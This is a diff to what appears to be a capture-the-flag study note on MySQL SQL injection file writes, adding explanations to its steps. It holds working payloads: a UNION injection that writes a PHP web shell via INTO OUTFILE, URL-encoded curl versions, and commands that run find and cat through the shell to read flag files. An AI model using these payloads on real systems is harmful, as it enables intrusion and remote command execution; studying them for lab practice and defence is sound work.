@@ -4,9 +4,11 @@
 
 ## Prerequisites — Three Requirements
 
-1. `FILE` privilege on the DB user (confirmed in Section 14)
-2. `secure_file_priv` is empty or points to a writable path (not NULL)
-3. OS-level write permission on the target directory
+Three things must be true before you can write files through MySQL:
+
+1. The database user must have the `FILE` privilege (confirmed in Section 14)
+2. `secure_file_priv` must be empty or point to a writable path (not NULL)
+3. The operating system account that MySQL runs as must have write permission on the target directory
 
 ---
 
@@ -51,8 +53,8 @@ cn' UNION SELECT "", "content here", "", "" INTO OUTFILE '/var/www/html/output.t
 cn' union select "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -
 ```
 
-- `$_REQUEST[0]` — accepts commands via GET/POST parameter `?0=COMMAND`
-- Empty strings for other columns — keeps the file clean (no junk numbers written)
+- `$_REQUEST[0]` — accepts OS commands via the GET or POST parameter `?0=COMMAND`
+- Empty strings for the other columns — keeps the file clean so no junk numbers get written to it
 
 **Verify and use:**
 ```bash
@@ -65,6 +67,7 @@ curl "http://TARGET_IP:PORT/shell.php?0=find+/+-name+'flag*'+-o+-name+'*.flag'+2
 # Read flag
 curl "http://TARGET_IP:PORT/shell.php?0=cat+/var/www/flag.txt"
 ```
+> Three commands to verify the shell, find flag files, and read them. The `?0=` parameter passes OS commands to the PHP `system()` call. URL-encode spaces as `+`. Replace `TARGET_IP`, `PORT`, and file paths with your target's values.
 
 ---
 
@@ -88,6 +91,7 @@ If the webroot is unknown:
 curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,variable_name,variable_value,4+FROM+information_schema.global_variables+where+variable_name=%22secure_file_priv%22--+-"
 # Returns: SECURE_FILE_PRIV | (empty) | 4  → write anywhere
 ```
+> Checks the `secure_file_priv` setting via UNION injection. An empty value in the response means the MySQL user can write to any directory. Replace `TARGET_IP` and `TARGET_PORT` with your target's values.
 
 **Step 2 — Write shell.php:**
 
@@ -95,6 +99,7 @@ curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+UNION+SELECT+1,
 curl -s "http://TARGET_IP:TARGET_PORT/search.php?port_code=cn%27+union+select+%22%22,%22%3C%3Fphp+system(%24_REQUEST%5B0%5D)%3B+%3F%3E%22,%22%22,%22%22+into+outfile+%27/var/www/html/shell.php%27--+-"
 # No error in response = success
 ```
+> Writes a PHP web shell to `/var/www/html/shell.php` via URL-encoded UNION injection. The payload decodes to `<?php system($_REQUEST[0]); ?>`. No response content means success; an error means the write failed.
 
 **Step 3 — Find and read the flag:**
 
@@ -104,6 +109,7 @@ curl "http://TARGET_IP:TARGET_PORT/shell.php?0=find+/+-name+'flag*'+-o+-name+'*.
 
 curl "http://TARGET_IP:TARGET_PORT/shell.php?0=cat+/var/www/flag.txt"
 ```
+> Uses the uploaded shell to search for flag files, then reads the result. Replace `TARGET_IP`, `TARGET_PORT`, and the flag path with your target's values.
 
 **Result:**
 ```
